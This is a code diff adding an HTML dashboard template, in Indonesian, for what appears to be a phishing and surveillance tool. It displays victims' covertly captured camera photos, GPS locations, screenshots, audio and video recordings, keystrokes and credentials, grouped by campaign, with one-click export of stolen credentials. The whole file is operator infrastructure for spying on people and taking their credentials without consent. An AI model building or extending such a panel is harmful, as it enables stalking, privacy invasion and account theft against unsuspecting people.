@@ -1,0 +1,96 @@
+{% extends "base.html" %}
+{% block title %}Dashboard{% endblock %}
+{% block head %}
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+{% endblock %}
+{% block body %}
+
+<header class="topbar">
+  <h1>Dashboard <span class="badge" id="totalBadge">{{ stats.total }} sesi</span></h1>
+  <div class="top-actions">
+    <a class="btn" href="/" target="_blank">Capture</a>
+    <a class="btn gray" href="/api/export/zip">ZIP</a>
+    <a class="btn gray" href="/api/export/creds">Creds CSV</a>
+    <button class="btn gray" id="btnRefresh">Refresh</button>
+    <a class="btn red" href="#" id="btnDeleteAll">Hapus Semua</a>
+    <a class="btn red" href="/logout">Logout</a>
+  </div>
+</header>
+
+<section class="stats-grid">
+  <div class="stat-card"><div class="num">{{ stats.total }}</div><div class="lbl">Total Sesi</div></div>
+  <div class="stat-card"><div class="num">{{ stats.with_photo }}</div><div class="lbl">Ada Foto</div></div>
+  <div class="stat-card"><div class="num">{{ stats.with_gps }}</div><div class="lbl">Ada GPS</div></div>
+  <div class="stat-card"><div class="num">{{ stats.with_screenshot }}</div><div class="lbl">Screenshot</div></div>
+  <div class="stat-card"><div class="num">{{ stats.keys_total }}</div><div class="lbl">Keylog</div></div>
+  <div class="stat-card"><div class="num">{{ stats.creds_total }}</div><div class="lbl">Credentials</div></div>
+</section>
+
+<section class="charts-row">
+  <div class="chart-box"><h3>7 Hari Terakhir</h3><canvas id="chartTimeline"></canvas></div>
+  <div class="chart-box"><h3>Top Kota</h3><canvas id="chartCities"></canvas></div>
+</section>
+
+<section class="filters">
+  <input id="searchBox" placeholder="Cari IP / kota / ISP / campaign...">
+  <select id="filterCampaign"><option value="">Semua campaign</option></select>
+  <select id="filterPhoto">
+    <option value="">Semua</option>
+    <option value="yes">Ada foto</option>
+    <option value="no">Tanpa foto</option>
+  </select>
+</section>
+
+<section id="cards" class="grid">
+  {% for s in sessions %}
+  <div class="card" data-ts="{{ s.ts }}"
+       data-search="{{ (s.ip_publik or '') }} {{ (s.ip_koneksi or '') }} {{ (s.city or '') }} {{ (s.region or '') }} {{ (s.isp or '') }} {{ (s.campaign or '') }}"
+       data-campaign="{{ s.campaign or 'default' }}"
+       data-has-photo="{{ 'yes' if (s.has_depan or s.has_belakang) else 'no' }}">
+    <div class="imgs">
+      {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" target="_blank"><img src="/api/file/{{ s.ts }}_depan.png" loading="lazy"></a>{% endif %}
+      {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" target="_blank"><img src="/api/file/{{ s.ts }}_belakang.png" loading="lazy"></a>{% endif %}
+      {% if not s.has_depan and not s.has_belakang %}<div class="no-photo">Tidak ada foto</div>{% endif %}
+    </div>
+    <div class="info">
+      <div class="row"><b>Waktu:</b> {{ s.waktu }}</div>
+      <div class="row"><b>IP:</b> {{ s.ip_publik or s.ip_koneksi or '-' }} {% if s.is_vpn %}<span class="tag vpn">VPN</span>{% endif %}</div>
+      <div class="row"><b>Kota:</b> {{ s.city or '-' }}, {{ s.region or '-' }}</div>
+      <div class="row"><b>ISP:</b> {{ s.isp or '-' }}</div>
+      <div class="row"><b>Campaign:</b> <span class="tag">{{ s.campaign or 'default' }}</span></div>
+      <div class="row"><b>Keylog:</b> {{ s.keylog_count }} | <b>Creds:</b> {{ s.clipboard_count }}</div>
+      {% if s.lat and s.lon %}
+        <div class="row"><b>GPS:</b> {{ "%.5f"|format(s.lat) }}, {{ "%.5f"|format(s.lon) }}</div>
+        <div class="mini-map" id="map-{{ s.ts }}"></div>
+      {% endif %}
+      <div class="actions">
+        <a href="#" class="btn-action show-detail" data-ts="{{ s.ts }}">Detail</a>
+        <a href="#" class="btn-action show-events" data-ts="{{ s.ts }}">Event</a>
+        <a href="#" class="btn-action show-keys" data-ts="{{ s.ts }}">Keys</a>
+        <a href="#" class="btn-action show-burst" data-ts="{{ s.ts }}">Burst</a>
+        {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" download class="btn-action">Depan</a>{% endif %}
+        {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" download class="btn-action">Belakang</a>{% endif %}
+        {% if s.has_screenshot %}<a href="/api/file/{{ s.ts }}_screenshot.png" target="_blank" class="btn-action">Screen</a>{% endif %}
+        {% if s.has_audio %}<a href="/api/file/{{ s.ts }}_audio.webm" target="_blank" class="btn-action">Audio</a>{% endif %}
+        {% if s.has_video %}<a href="/api/file/{{ s.ts }}_video.webm" target="_blank" class="btn-action">Video</a>{% endif %}
+        <a href="#" class="btn-action del" data-ts="{{ s.ts }}">Hapus</a>
+      </div>
+    </div>
+  </div>
+  {% endfor %}
+</section>
+
+{% if not sessions %}
+<p style="text-align:center;color:#888;padding:40px">Belum ada sesi.</p>
+{% endif %}
+
+<script>
+window.SESSIONS = {{ sessions|tojson }};
+window.STATS = {{ stats_json|safe }};
+</script>
+<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+{% endblock %}
